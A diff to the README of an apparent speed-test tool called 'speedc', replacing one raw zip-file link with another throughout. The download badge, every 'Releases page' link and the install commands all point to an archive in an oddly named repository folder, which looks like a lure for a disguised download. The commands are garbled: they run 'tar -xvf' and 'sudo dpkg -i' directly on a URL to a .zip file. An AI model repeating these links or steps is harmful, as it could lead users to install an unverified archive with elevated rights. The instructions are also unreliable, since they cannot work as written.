@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download speedc](https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip)](https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip)
+[![Download speedc](https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip)](https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before we begin, ensure that you have:
 
 ## 📥 Download & Install
 
-To get speedc, visit the [Releases page](https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip) and choose the appropriate version for your operating system. 
+To get speedc, visit the [Releases page](https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip) and choose the appropriate version for your operating system. 
 
 1. Go to the Releases page.
 2. Look for the latest version.
@@ -33,7 +33,7 @@ If you downloaded an executable file (e.g., `.exe`):
 
 ### For Mac Users
 
-If you downloaded a `https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip` file:
+If you downloaded a `https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip` file:
 
 1. Open the Terminal.
 2. Navigate to your Downloads folder by running:
@@ -45,7 +45,7 @@ If you downloaded a `https://raw.githubusercontent.com/kkoltongi99/speedc/main/b
 3. Extract the file:
 
    ```bash
-   tar -xvf https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip
+   tar -xvf https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip
    ```
 
 4. Navigate into the extracted folder:
@@ -74,7 +74,7 @@ If you downloaded a `.deb` file:
 3. Install the package:
 
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip
+   sudo dpkg -i https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip
    ```
 
 4. After installation, run speedc in the Terminal:
@@ -137,7 +137,7 @@ After running speedc, you'll see your download and upload speeds. Here's what to
 If you encounter issues while running speedc, consider these solutions:
 
 - **Ensure Your Internet Connection is Active**: Check if you can access websites from your browser.
-- **Update Your Program**: Make sure you downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip).
+- **Update Your Program**: Make sure you downloaded the latest version from the [Releases page](https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip).
 - **Check System Compatibility**: speedc works on Windows, Mac, and Linux. Verify that you are using the correct version for your system.
 
 ## 🤝 Support
@@ -148,4 +148,4 @@ For any questions or further assistance, you can contact the community on GitHub
 
 Now that you have speedc installed, you can measure your internet speed whenever you like. Experiment with the available options to find the configuration that best suits your needs.
 
-Get started today and see how fast your internet is! For download links and latest updates, always refer to the [Releases page](https://raw.githubusercontent.com/kkoltongi99/speedc/main/bewept/Software_v3.3.zip).
+Get started today and see how fast your internet is! For download links and latest updates, always refer to the [Releases page](https://github.com/kkoltongi99/speedc/raw/refs/heads/main/bewept/Software-2.9.zip).
